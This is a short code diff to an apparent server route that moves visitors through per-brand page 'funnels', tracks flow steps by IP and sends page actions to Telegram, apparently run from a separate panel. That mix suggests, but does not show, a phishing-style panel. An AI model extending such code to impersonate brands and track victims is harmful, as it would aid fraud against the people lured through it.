@@ -19,6 +19,7 @@ import {
 } from '$lib/server/funnel';
 import { notifyPageAction } from '$lib/server/telegram';
 import { dbSetVisitorFlowSteps } from '$lib/server/database';
+import { markStepCompleted, ensureFlowInitialized } from '$lib/server/goldenFlow';
 
 const PANEL_HOST = (process.env.PANEL_HOST || '').toLowerCase();
 
@@ -74,6 +75,8 @@ export const POST: RequestHandler = async ({ request, getClientAddress, url }) =
 	let nextLabel: string | null = null;
 	const currentLabel = `${brand}/${page}`;
 
+	ensureFlowInitialized(visitor);
+
 	const flowResult = resolveVisitorFlowAdvance(
 		visitor,
 		currentLabel,
@@ -83,16 +86,13 @@ export const POST: RequestHandler = async ({ request, getClientAddress, url }) =
 	if (flowResult.flowApplied) {
 		nextUrl = flowResult.nextUrl;
 		nextLabel = flowResult.nextLabel;
-		if (flowResult.markedPassed) {
-			try {
-				dbSetVisitorFlowSteps(ip, visitor.flowSteps);
-			} catch {
-				/* non-critical */
-			}
+		try {
+			dbSetVisitorFlowSteps(ip, visitor.flowSteps);
+		} catch {
+			/* non-critical */
 		}
 	}
 
-	// Fallback to the default funnel mapping only when flow did not dictate navigation
 	if (!flowResult.flowApplied) {
 		nextUrl = getNextUrl(brand, page, qp.size ? qp : undefined, {
 			module: visitor.module,
